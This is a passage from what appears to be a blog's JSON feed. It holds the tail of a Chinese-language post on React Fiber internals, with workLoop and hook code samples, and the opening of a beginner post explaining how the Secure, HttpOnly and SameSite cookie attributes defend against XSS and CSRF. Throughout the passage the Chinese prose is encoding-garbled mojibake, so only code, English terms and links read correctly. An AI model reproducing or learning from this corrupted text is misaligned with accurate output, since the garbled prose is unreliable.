href=\"#effect-list\">#</a> Effect List</h2>\n<p>åœ¨ä¸Šä¸€å¼µåœ–ä¸­ï¼Œæœ‰æ¨™è¨˜æ¨™ç±¤çš„å…ƒä»¶æ˜¯éœ€è¦ side effect é€²è¡Œè™•ç†çš„ï¼Œç‚ºäº†é”åˆ°é«˜æ•ˆçš„è™•ç†ï¼Œå› æ­¤éœ€è¦å°‡åŸæœ¬çš„æ¨¹ç‹€å’§è¡¨è½‰æ›ç‚ºç·šæ€§åˆ—è¡¨ï¼Œæ‰èƒ½å¤ å¿«é€Ÿçš„éæ­·ï¼Œé™¤æ­¤ä¹‹å¤–é‚„æœƒçœç•¥æ²’æœ‰ side effect çš„ç¯€é»ï¼Œæµç¨‹å¦‚ä¸‹åœ–ï¼š</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p7.png\" alt=\"\"></p>\n<p>é †åºçš„éƒ¨åˆ†æ˜¯å¾å­åˆ°çˆ¶çš„æ–¹å¼å»åŸ·è¡Œï¼Œåœ¨å„å€‹éšæ®µå¦‚æœç‚ºè©²å±¤çµæ§‹<strong>ç¬¬ä¸€å€‹ç¯€é»</strong>æœƒè¨˜éŒ„åœ¨ firstEffectï¼Œå…¶å¾Œå‰‡æœƒè¨˜éŒ„åœ¨ nextEffect ç•¶ä¸­ï¼Œä¸¦æœƒåœ¨çˆ¶å±¤ç´šå°‡å…¶åˆä½µèµ·ä¾†ä¸¦å°‡è‡ªå·±ç¶å…¥ lastEffect ï¼Œä¸¦å‘ä¸Šå‚³éï¼Œé‡åˆ°æ²’æœ‰ effect çš„ç¯€é»æœƒç›´æ¥å‘ä¸Šå‚³éè€Œä¸é€²è¡Œæ›´å‹•ï¼Œæœ€å¾Œå°‡æ‰€æœ‰é †åºå‚³éè‡³ Root å±¤å»ºç«‹å‡ºå¦‚ä¸‹åœ–çš„ effect listã€‚</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p8.png\" alt=\"Re: Effect list\"><br>\n<a href=\"https://youtu.be/ZCuYPiUIONs?t=1373\">source video</a></p>\n<h2 id=\"render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\"><a class=\"direct-link\" href=\"#render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\">#</a> Render éšæ®µçš„å·¥ä½œå¾ªç’°</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">workLoop</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">isYieldy</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>isYieldy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush work without yielding</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush asynchronous work until the deadline runs out of time.</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">shouldYield</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>åœ¨ä¸Šé¢<a href=\"https://github.com/facebook/react/blob/f765f022534958bcf49120bf23bc1aa665e8f651/packages/react-reconciler/src/ReactFiberScheduler.js#L1136\">ç¨‹å¼ç¢¼</a>ä¸­ï¼ŒnextUnitOfWork å­˜æœ‰ workInProgress æ¨¹ä¸­çš„ Fiber nodesã€‚ç•¶ React è¼ªè©¢ Fiber tree æ™‚ï¼Œå®ƒæœƒä½¿ç”¨é€™å€‹è®Šé‡ä¾†çŸ¥æ›‰æ˜¯å¦æœ‰ä»»ä½•å…¶ä»– Fiber nodes å…·æœ‰æœªå®Œæˆçš„å·¥ä½œã€‚ç›®å‰çš„ Fiber è™•ç†å®Œå¾Œï¼ŒnextUnitOfWork æœƒæŒ‡å‘ä¸‹ä¸€å€‹ Fiber node æˆ–è€… null (çµæŸ)ã€‚</p>\n<p>è¼ªè©¢ Fiber trees ä¸»è¦æ ¹æ“šä»¥ä¸‹å››å€‹åŠŸèƒ½ï¼š</p>\n<ul>\n<li>performUnitOfWork</li>\n<li>beginWork</li>\n<li>completeUnitOfWork</li>\n<li>completeWork</li>\n</ul>\n<p>åŸ·è¡Œé †åºåƒè€ƒå¦‚ä¸‹åœ–ï¼š</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p9.gif\" alt=\"\"><br>\n<a href=\"https://images.indepth.dev/images/2019/08/tmp2.gif\">source image</a></p>\n<p>ç”±æ–¼é€éäº†æ·±åº¦å„ªå…ˆæœå°‹(DFS)ï¼Œæ•´å€‹æµç¨‹æœƒå„ªå…ˆåŸ·è¡Œåº•éƒ¨ child node çš„å·¥ä½œï¼Œæœ€å¾Œæ‰æœƒåˆ° parent nodeã€‚</p>\n<h2 id=\"commit-%E9%9A%8E%E6%AE%B5\"><a class=\"direct-link\" href=\"#commit-%E9%9A%8E%E6%AE%B5\">#</a> Commit éšæ®µ</h2>\n<p>åœ¨é€™å€‹éšæ®µï¼ŒReact æœƒå°‡ render phase æ‰€ç”¢ç”Ÿçš„ workInProgress tree è½‰ç§»åˆ° current treeï¼Œä¸¦åŸ·è¡Œ render phase æ‰€æ¯”å°æ‰€ç”¢ç”Ÿçš„ Effect listï¼Œæ­¤æ­¥é©Ÿå°‡æœƒæœ‰æ›´æ–° Dom çš„ç¯€é»ç­‰ç­‰çš„æ“ä½œï¼Œå‡å¦‚æœ‰ä¸éœ€æ›´æ–°çš„é …ç›®å°‡ä¸æœƒåŒ…å«åœ¨ Effect list ä¸­ï¼Œæ‰€ä»¥ä¸æœƒè¢« commit (æ›´æ–°)ã€‚</p>\n<p>è€ŒåŸ·è¡Œå®Œå¾Œçš„ current tree å°‡æœƒè¢«æ”¾åˆ° finishedWork tree ä¸­ã€‚</p>\n<p>è€Œåœ¨æ­¤éšæ®µå°‡æœƒè§¸ç™¼ä»¥ä¸‹æ“ä½œï¼š</p>\n<ul>\n<li>åŸ·è¡Œ getSnapshotBeforeUpdate event</li>\n<li>åŸ·è¡Œ componentWillUnmount event</li>\n<li>åŸ·è¡Œæ‰€æœ‰ DOM æ“ä½œ</li>\n<li>å°‡ finishedWork tree è¨­ç½®ç‚º current tree</li>\n<li>åŸ·è¡Œ componentDidMount event</li>\n<li>åŸ·è¡Œ componentDidUpdate event</li>\n</ul>\n<h3 id=\"dom-%E6%9B%B4%E6%96%B0\"><a class=\"direct-link\" href=\"#dom-%E6%9B%B4%E6%96%B0\">#</a> Dom æ›´æ–°</h3>\n<p><a href=\"https://github.com/facebook/react/blob/95a313ec0b957f71798a69d8e83408f40e76765b/packages/react-reconciler/src/ReactFiberScheduler.js#L376\">commitAllHostEffects</a> æ˜¯Reactåœ¨å…¶ä¸­åŸ·è¡ŒDOMæ›´æ–°çš„å‡½æ•¸ã€‚è©²å‡½æ•¸å®šç¾©äº† Dom éœ€è¦åŸ·è¡Œçš„æ“ä½œé¡å‹ã€‚</p>\n<h2 id=\"%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\"><a class=\"direct-link\" href=\"#%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\">#</a> è¼ƒå°‘åœ¨ç”¨ class component ï¼Œé‚£ä¾†è«‡è«‡ function component</h2>\n<p>æ™‚è‡³ä»Šæ—¥ï¼Œfunction component æ­é… hooks å¹¾ä¹å·²æˆäº†ä¸»æµï¼Œè€Œ function component åœ¨æ¸²æŸ“æ™‚å¯ä»¥é¿å…å¤šé¤˜çš„åˆ¤æ–· (<a href=\"https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L1306\">mountIndeterminateComponent</a>)</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p10.png\" alt=\"RE: React hooks\"><br>\n<a href=\"https://medium.com/the-guild/under-the-hood-of-reacts-hooks-system-eb59638c9dba\">under-the-hood-of-reacts-hooks-system</a></p>\n<p>è€Œå¤§å®¶å¸¸ç”¨çš„ <a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiberHooks.new.js\">hook</a> å‰‡æœƒå½¢æˆ hook éŠï¼Œä¿å­˜åœ¨ Fiber çš„ memoizedState ä¸­ï¼Œé€šé dispatcher å»æ›´æ–° fiber å…§çš„ state åŠ effect ç‹€æ…‹ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> hook<span class=\"token operator\">:</span> Hook <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  memoizedState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">// hook çš„ç‹€æ…‹</span><br>  baseState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//èµ·å§‹ state</span><br>  baseQueue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//èµ·å§‹ queue</span><br>  queue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//éœ€è¦æ›´æ–°çš„update</span><br>  next<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//ä¸‹ä¸€å€‹hook</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre>\n<p>ä¾‹å¦‚ const [state, updateState] = useState(initialState)ï¼Œ memoizedState å°±æ˜¯ initialStateã€‚</p>\n<p>æ¯å€‹ hook éƒ½æœƒè¢«æ”¾åˆ° queue ç•¶ä¸­ã€‚ç•¶æ‚¨èª¿ç”¨ setState å‡½æ•¸æ™‚ï¼ŒReact å…¶å¯¦ä¸æœƒç«‹å³èª¿ç”¨ updater å‡½å¼ï¼Œè€Œæ˜¯å°‡å…¶ä¿å­˜åœ¨éšŠåˆ—ä¸­ä¸¦å®‰æ’é‡æ–°æ¸²æŸ“ã€‚</p>\n<!-- è‡³æ–¼å„ªåŒ–å¸¸ç”¨çš„ [useMemo](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L370) å‰‡æœƒå°‡å…ƒä»¶æ”¹ç‚ºè¼ƒç‚º[æ·ºå±¤çš„æ¯”å°](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L456) -->\n<h3 id=\"%E5%8F%83%E8%80%83\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83\">#</a> åƒè€ƒ</h3>\n<p><a href=\"https://segmentfault.com/a/1190000039225217\">https://segmentfault.com/a/1190000039225217</a><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a><br>\n<a href=\"https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react\">https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react</a><br>\n<a href=\"https://www.bilibili.com/video/av48384879/\">https://www.bilibili.com/video/av48384879/</a></p>\n<p>å»¶ä¼¸é–±è®€<br>\n<a href=\"https://segmentfault.com/a/1190000017241034?utm_source=sf-related\">https://segmentfault.com/a/1190000017241034?utm_source=sf-related</a></p>\n",
      "date_published": "2021-05-28T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/",
      "title": "é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸‰ï¼‰-ç¶²ç«™å®‰å…¨ä¸‰æœ¬æŸ±ï¼ˆSecure &amp; SameSite &amp; HttpOnlyï¼‰",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p><strong>ä¿è­· Cookieå®ˆè¡›ç¶²ç«™å®‰å…¨çš„ä¸‰æœ¬æŸ±æœ‰ä¸åŒçš„è·è²¬å’Œèƒ½åŠ›</strong><br>\nSecure è¡¨ç¤ºï¼šæˆ‘ä¸æœƒè®“ Cookieå»ä»»ä½•å±éšªçš„åœ°æ–¹ï¼<br>\nHttpOnly è¡¨ç¤ºï¼šåªè¦æœ‰æˆ‘åœ¨çš„åœ°æ–¹ <em>åˆ¥æƒ³æ‰¾åˆ°</em> Cookieï¼<br>\nSameSite è¡¨ç¤ºï¼šæ‰€æœ‰å’Œ Cookie ä¾†æºä¸åŒçš„è«‹æ±‚éƒ½åˆ¥æƒ³æˆåŠŸï¼</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> é‡‹ä¾‹</h2>\n<p>ä»Šå¤©è¦èŠçš„é€™ä¸‰ç¨®å±¬æ€§ï¼Œå¯ä»¥èªªæ˜¯åœ¨ç¶²é å®‰å…¨çš„é˜²è­·ä¸Š CP å€¼æœ€é«˜çš„è¨­å®šï¼Œæƒ³è®“ä½ äº†è§£ç€è¦½å™¨ç‚ºä»€éº¼éœ€è¦é€™ä¸‰ç¨®è¨­å®šï¼Œè€Œé€™ä¸‰ç¨®å±¬æ€§åˆç‚ºä»€éº¼æœƒè¢«ç¨±ç‚ºç¶²ç«™å®‰å…¨ä¸‰æœ¬æŸ±ï¼Œä»–å€‘æ“æœ‰ç”šéº¼æ¨£çš„åŠŸèƒ½å’Œè¦å¦‚ä½•é€²è¡Œè¨­å®šï¼Œé€™äº›æ˜¯æˆ‘å¸Œæœ›ä»Šå¤©èƒ½å¸¶çµ¦ä½ çš„å°çŸ¥è­˜ï¼Œé‚£éº¼è©±ä¸å¤šèªªï¼Œå°±è®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ã€‚</p>\n<h3 id=\"secure\"><a class=\"direct-link\" href=\"#secure\">#</a> Secure</h3>\n<p><strong>Secure</strong> æ‡‰è©²æ˜¯å±¬æ–¼ä¸‰æœ¬æŸ±ä¸­æœ€å–®ç´”çš„ä¸€ä½ï¼Œä»–çš„è¨´æ±‚å¾ˆç°¡å–®ï¼Œæ‰€æœ‰åªè¦ç¶²ç«™é–‹é ­ä¸æ˜¯ https é–‹é ­çš„ç¶²ç«™éƒ½æ²’æœ‰è¾¦æ³•ç²å¾— Cookie ä¸­çš„è³‡è¨Šï¼Œèˆ‰ä¾‹ä¾†èªªï¼š</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p1.png\" alt=\"\"></p>\n<p>ç¶²ç«™çš„ Cookie å„²å­˜äº†5å€‹å€¼ï¼Œç„¡è«–æ˜¯ç¶²ç«™æœ¬èº«çš„é…ç½®éŒ¯èª¤è®“ä½ å¯ä»¥é¸æ“‡ä½¿ç”¨ https æˆ– http ç€è¦½ï¼Œé‚„æ˜¯æ”»æ“Šè€…æŠŠä½ é‡å°å‘åˆ°ä»–åœ¨ç¶²ç«™å­åŸŸå»ºç«‹çš„æœªåŠ å¯†çš„æƒ¡æ„ http ç¶²å€è£¡ï¼ŒåŸºæœ¬ä¸Šåœ¨ http ä¸­ç¶²ç«™èƒ½ç²å¾—çš„ï¼Œåªæœƒå‰©ä¸‹ç¬¬ä¸€å€‹ Secure æ²’æœ‰æ‰“å‹¾çš„å€¼ï¼Œå› ç‚º Secure æœƒé˜»æ­¢æ‰€æœ‰ä»–æœ‰æ‰“å‹¾çš„å€¼å‡ºç¾åœ¨ http ä¸­ï¼Œæœ€ç›´è§€çš„æ„Ÿå—å°±æ˜¯ï¼Œç•¶ä½ ä¸å°å¿ƒé€£æ¥åˆ° http çš„é é¢ä¸­çš„æ™‚å€™ä»–æœƒæŠŠä½ ç™»å‡ºï¼Œå› ç‚ºä»–æ‰¾ä¸åˆ°å¯ä»¥è­‰æ˜ä½ èº«åˆ†çš„é‚£äº› Cookie çš„å€¼ï¼Œé€™å€‹æ™‚å€™åƒè¬åˆ¥å‚»å‚»çš„å†ç™»å…¥ä¸€æ¬¡ï¼Œå› ç‚ºåœ¨ http ä¸­å‚³é€çš„è³‡æ–™å¯éƒ½æ˜¯æœªåŠ å¯†çš„é˜¿ï¼</p>\n<h3 id=\"httponly\"><a class=\"direct-link\" href=\"#httponly\">#</a> HttpOnly</h3>\n<p>è€Œ <strong>HttpOnly</strong> å‰‡å¯ä»¥èªªä»–æ˜¯ XSS ä¹‹æ•µï¼Œå¦‚æœæœ‰çœ‹éæˆ‘çš„ <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">åŸºç¤ç¬¬äºŒç¯‡ XSS æ”»æ“Šä»‹ç´¹</a> çš„æœ‹å‹ï¼Œå¯ä»¥ç™¼ç¾åœ¨ XSS æ”»æ“Šä¸­ï¼Œç¶²ç«™æœƒå…è¨±æ”»æ“Šè€…åœ¨ç¶²ç«™ä¸­æ¤å…¥æƒ¡æ„çš„ JavaScript è—‰æ­¤ç«Šå–ä½¿ç”¨è€…çš„ Cookie ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p2.png\" alt=\"\"></p>\n<p>ç¶²ç«™çš„ Cookie å„²å­˜äº†5å€‹å€¼ï¼Œç•¶æ”»æ“Šè€…åœ¨æœ‰ XSS æ”»æ“Šæ¼æ´ä¸­çš„ç¶²ç«™æ¤å…¥æƒ¡æ„ç¨‹å¼æ™‚ï¼Œä¾‹å¦‚å‰ç«¯å¸¸ç”¨ä¾†æŸ¥è©¢ Cookie çš„ JavaScript æŒ‡ä»¤ document.cookie ï¼Œå°±æ˜¯æ”»æ“Šè€…æœ€å¸¸ä½¿ç”¨çš„æ”»æ“Šæ–¹å¼ï¼Œæ”»æ“Šè€…æœƒåœ¨ç¶²ç«™ä¸­åŸ·è¡Œ document.cookie ä¸¦å°‡çµæœå‚³é€çµ¦æ”»æ“Šè€…ï¼Œä½†å¦‚æœæˆ‘çš„ç¶²ç«™ä¸­å°æ•æ„Ÿçš„ Cookie å€¼è¨­å®šäº† HttpOnly æœƒç™¼ç”Ÿç”šéº¼äº‹ï¼Ÿ</p>\n<p>æ”»æ“Šè€…æœƒç™¼ç¾å³ä½¿ç¶²ç«™æœ‰ XSS æ¼æ´ï¼Œä¹ŸæˆåŠŸçš„æ¤å…¥äº†æƒ¡æ„ç¨‹å¼ï¼Œä½†å»æ²’æœ‰å°‡ä½ å—åˆ° HttpOnly ä¿è­·çš„ Cookie å€¼å‚³é€å›ä¾†ï¼Œç‚ºä»€éº¼æœƒé€™æ¨£å‘¢ï¼Ÿ</p>\n<p>åŸå› æ˜¯å› ç‚º HttpOnly çš„åŠŸèƒ½å°±æ˜¯æ‹’çµ•èˆ‡ JavaScript å…±äº« Cookie ï¼Œç•¶ Cookie ä¸­åŒ…å«äº†è¨­å®š HttpOnly çš„å€¼ä¹‹å¾Œï¼ŒHttpOnly æœƒæ‹’çµ•é€™å€‹è«‹æ±‚ï¼Œè—‰æ­¤ä¾†ä¿è­· Cookie ä¸è¢«ä¸å—ä¿¡ä»»çš„ JavaScript å­˜å–ï¼Œå¯ä»¥ç¨±ä»–ç‚ºç•¶ä¹‹ç„¡æ„§çš„ XSS ä¹‹æ•µã€‚</p>\n<p>ä¸éé¡å¤–ä¸€æï¼Œä¸¦ä¸æ˜¯åªè¦è¨­ç½®äº† HttpOnly ä¹‹å¾Œï¼Œå³ä½¿ç¶²ç«™æœ‰ XSS æ¼æ´ä¹Ÿå¯ä»¥é«˜æ•ç„¡æ†‚ï¼Œæ›¾ç¶“ç¢°éä¸€å€‹å¯¦ä¾‹æ˜¯ç•¶æŸç¶²ç«™æœå°‹çš„ç”¢å“ ID éŒ¯èª¤æ™‚ï¼Œç¶²ç«™æœƒå°‡ç•¶ä¸‹é é¢çš„æ‰€æœ‰è³‡è¨Šç´€éŒ„åœ¨é é¢ä¸Šï¼ˆåŒ…å« Cookieï¼‰æ–¹ä¾¿å·¥ç¨‹å¸«é™¤éŒ¯ï¼Œæ–¼æ˜¯æ”»æ“Šè€…ä¾¿åœ¨ç¶²ç«™ä¸­åµŒå…¥ä¸€å€‹ç•¶ä½¿ç”¨è€…é€²å…¥é é¢æ™‚é è¨­æœå°‹ä¸€å€‹éŒ¯èª¤çš„ç”¢å“ ID ä¸¦å°‡æ•´å€‹ç•¶ä¸‹é é¢å‚³é€çµ¦æ”»æ“Šè€…çš„æƒ¡æ„ç¨‹å¼ï¼Œé™¤äº† Cookie ä»¥å¤–é‚„é™„è´ˆäº†ä¼ºæœå™¨ç‰ˆæœ¬å’Œå¥—ä»¶ç‰ˆæœ¬ï¼Œç›´æ¥å°±æ˜¯ä¸€å€‹è³‡è¨Šæ´©æ¼å¤§ç¦®åŒ…ã€‚</p>\n<h3 id=\"samesite\"><a class=\"direct-link\" href=\"#samesite\">#</a> SameSite</h3>\n<p>è¬›åˆ°é€™é‚Šå¯èƒ½æœ‰äººæœƒå•ï¼Œå¦‚æœæœ‰ <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">XSS</a> ä¹‹æ•µï¼Œé‚£ CSRF æ˜¯ä¸æ˜¯ä¹Ÿæœ‰ï¼Ÿç•¶ç„¶æœ‰ï¼å·¥ç¨‹å¸«ä¹Ÿæœ‰åŒæ¨£çš„ç–‘å•ï¼Œæ–¼æ˜¯ SameSite é€™å€‹ CSRF ä¹‹æ•µä¹Ÿå‡ºç¾äº†ï¼</p>\n<p>é‚£é€™å€‹æœ€æ™šæ‰èª•ç”Ÿçš„ç€è¦½å™¨å®‰å…¨å±¬æ€§æœ‰ç”šéº¼ç‰¹åˆ¥ä¹‹è™•ï¼Œå¯ä»¥è¢«ç¨±ç‚º CSRF ä¹‹æ•µï¼Ÿåœ¨æˆ‘çš„ <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">è³‡å®‰é›¶åŸºç¤ç³»åˆ—ç¬¬ä¸€ç¯‡ CSRF æ”»æ“Šä»‹ç´¹</a> ä¸­ï¼Œå¯ä»¥å¾ˆæ¸…æ¥šçš„äº†è§£åˆ°ï¼Œ CSRF çš„ç‰¹æ€§åœ¨æ–¼æ”»æ“Šè€…è·¨ Domain å‘ç¶²ç«™æå‡ºè«‹æ±‚ï¼Œè€Œç¶²ç«™ç„¡æ¢ä»¶ä¿¡ä»» Cookie è€Œæ²’æœ‰å†ç¢ºèªæˆ–ä»¥å…¶ä»–æ–¹å¼é©—è­‰ï¼ŒåªçŸ¥é“é€™å€‹ Request å¸¶è‘—æŸå€‹ä½¿ç”¨è€…çš„ Cookieï¼Œä¾¿æ¥å—äº†é€™å€‹ Request ï¼Œå»ä¸æœƒå»ç¢ºèªé€™å€‹ Request æ˜¯ä¸æ˜¯ç”±ä½¿ç”¨è€…è‡ªé¡˜ç™¼å‡ºçš„ï¼ˆ å°±åƒæ˜¯èœå–®ä¸Šçš„æ¡Œè™Ÿæ˜¯ä½ çš„ï¼Œä½†ä¸ä»£è¡¨é€™å€‹èœæ˜¯ä½ é»çš„ ï¼‰ã€‚</p>\n<p>é‚£ä½ ä¸€å®šæœƒæƒ³ï¼Œé‚£å¦‚æœåªè¦ä¸æ˜¯æˆ‘åŸ·è¡Œæ“ä½œçš„é€™å€‹ Domain ä¸Šç™¼é€çš„æ‰€æœ‰ Request ï¼Œç¶²ç«™éƒ½é€šé€šä¸Ÿæ‰ä¸æ¥å—ä¸å°±å¥½äº†ï¼ˆ åªè¦ä¸æ˜¯ååœ¨åº—è£¡çš„äººçµ¦è€é—†çš„èœå–®è€é—†éƒ½ç›´æ¥ä¸Ÿæ‰ï¼‰ï¼Ÿ</p>\n<p>æ²’éŒ¯ï¼é€™å°±æ˜¯ SameSite é€™å€‹å±¬æ€§çš„ç‰¹æ€§ï¼Œç€è¦½å™¨æœƒæª¢æŸ¥ Request çš„ä¾†æºæ˜¯å¦èˆ‡ç™¼å¸ƒ Cookie çš„ä¾†æºç›¸åŒã€‚<br>\nå¦‚æœä¸æ˜¯ï¼Œç€è¦½å™¨å°±ä¸æœƒåœ¨ Request ä¸­åŒ…å«Cookieï¼Œå› æ­¤ä¾¿å¯ä»¥å¾æ ¹æœ¬ä¸Š CSRF çš„æ”»æ“Šä¾†é˜»æ­¢ã€‚</p>\n<p>ä½†å³ä½¿å¦‚æ­¤ï¼Œ SameSite å…¶å¯¦é‚„æ˜¯æœ‰ç ´ç¶»ï¼Œä»¥è‡ªèº«ç¶“æ­·ä¾†èªªï¼Œæ›¾ç¶“é‡éä¸€å€‹ç¶²ç«™è¨­ç½®äº† SameSite å»æ²’æœ‰è¨­å®š HttpOnly ï¼Œå› æ­¤æ”»æ“Šè€…åªè¦åœ¨ç¶²ç«™ä¸­åµŒå…¥ä¸€å€‹è®“ä½¿ç”¨è€…è‡ªå·±åŸ·è¡Œ document.cookie ï¼Œä¸¦å°‡åŸ·è¡Œå®Œæˆçš„çµæœé€çµ¦æ”»æ“Šè€…çš„æƒ¡æ„ç¨‹å¼ï¼Œæ–¼æ˜¯æ”»æ“Šè€…ä¸€æ¨£å¯ä»¥æ‹¿åˆ°ä½¿ç”¨è€…æ‰€æœ‰çš„ Cookie è³‡æ–™ã€‚</p>\n<p>ä¹Ÿè¨±ä½ æœƒèªªï¼Œé€™å€‹é»‘é‹ SameSite ä¸èƒŒï¼Œé€™æ˜¯ HttpOnly è¦è² çš„è²¬ä»»ï¼Œé€™æ¨£èªªç•¶ç„¶æ²’éŒ¯ï¼Œå› ç‚ºä¸‰å€‹å±¬æ€§æ²’æœ‰å…±å­˜çš„ç¢ºæœƒç”¢ç”Ÿé æœŸå¤–çš„å®‰å…¨é¢¨éšªï¼Œä¸èƒ½èªªé€™æ˜¯ SameSite çš„éŒ¯ï¼Œä½† SameSite é‚„çœŸæœ‰å…¶ä»–çš„å¼±é»ï¼Œå¦‚æœè¨­å®šçš„å€¼æ˜¯ Lax çš„è©±ï¼Œåªè¦åœ¨ç¶²ç«™å°é å¾Œçš„å…©åˆ†é˜å…§ï¼Œç€è¦½å™¨ç‚ºäº†é¿å…ç ´å£åˆ°æŸäº›ç¶²ç«™çš„ç™»å…¥æµç¨‹å’Œä½¿ç”¨è€…é«”é©—ï¼Œ SameSite çš„è¨­å®šæœƒè®Šæˆ none ï¼Œä¹Ÿå°±æ˜¯æ²’è¨­çš„æ„æ€ã€‚</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p3.png\" alt=\"\"></p>\n<p>æ‰€ä»¥å¦‚æœå¯ä»¥çš„è©±ï¼Œå»ºè­°é™¤äº†è¨­å®š SameSite ä»¥å¤–ï¼Œå†åŠ ä¸Š CSRF Token æœƒæ›´æœ‰æ•ˆçš„é˜²ç¯„ CSRF çš„æ”»æ“Šã€‚</p>\n<h2 id=\"%E5%AF%A6%E4%BD%9C%E4%B8%89%E6%9C%AC%E6%9F%B1\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BD%9C%E4%B8%89%E6%9C%AC%E6%9F%B1\">#</a> å¯¦ä½œä¸‰æœ¬æŸ±</h2>\n<p>èªªäº†é€™éº¼å¤šï¼Œæƒ³å¿…åˆ°é€™é‚Šä½ æ‡‰è©²ä¹Ÿå°é€™ä¸‰ç¨®ç€è¦½å™¨çš„å®‰å…¨å±¬æ€§æœ‰äº†ä¸€å®šçš„èªè­˜ï¼Œæœ‰é“æ˜¯åè€Œè¨€ä¸å¦‚èµ·è€Œè¡Œï¼Œè®€è¬å·æ›¸ä¸å¦‚è¡Œè¬é‡Œè·¯ï¼</p>\n<p>æœ‰é»å°·å°¬ä¸éç¸½è€Œè¨€ä¹‹ï¼Œä¾†ä»‹ç´¹å¯¦ä½œï¼</p>\n<h3 id=\"secure-%26-httponly\"><a class=\"direct-link\" href=\"#secure-%26-httponly\">#</a> Secure &amp;Â HttpOnly</h3>\n<h3 id=\"%E7%AC%AC%E4%B8%80%E6%AD%A5\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E6%AD%A5\">#</a> 